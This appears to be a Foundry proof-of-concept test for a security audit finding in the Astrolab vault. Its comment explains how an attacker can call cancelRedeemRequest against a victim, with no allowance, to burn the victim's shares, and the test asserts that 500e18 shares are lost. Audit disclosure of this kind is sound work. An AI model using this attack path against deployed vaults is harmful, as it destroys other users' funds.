// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, As4626Vault, LossMarker} from "./58097-c-02-wrong-usage-of-mapping-target-in-cancelredeemrequest-pa.sol";

// Astrolab C-02 (finding 58097): `cancelRedeemRequest` reads req.byOperator[operator]
// (the caller's own request) instead of req.byOperator[owner] and never checks
// operator allowance, so any user can burn another user's vault shares.
// Attacker requests redeem at price 1.5, price rises to 2.0, then cancels against
// the victim as owner — burning AMOUNT1 * (2.0-1.5)/1e18 = 500e18 of the victim's shares.
contract Finding58097Test is Test {
    function test_exploit_cancelRedeem_burnsVictimShares() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("victim shares burned (no permission)", e.victimBurned());
        emit log_named_uint("attacker allowance over victim", e.attackerAllowanceOverVictim());

        assertEq(e.victimBurned(), 500 ether, "victim lost 500e18 shares with no allowance");
        assertEq(e.attackerAllowanceOverVictim(), 0, "attack needed no allowance");
        assertEq(e.vault().balanceOf(0x000000000000000000000000000000000000bEEF), 500 ether, "victim balance halved");
        assertEq(e.marker().balanceOf(0x000000000000000000000000000000000000D00d), 500 ether, "loss marker minted to sink");
    }
}
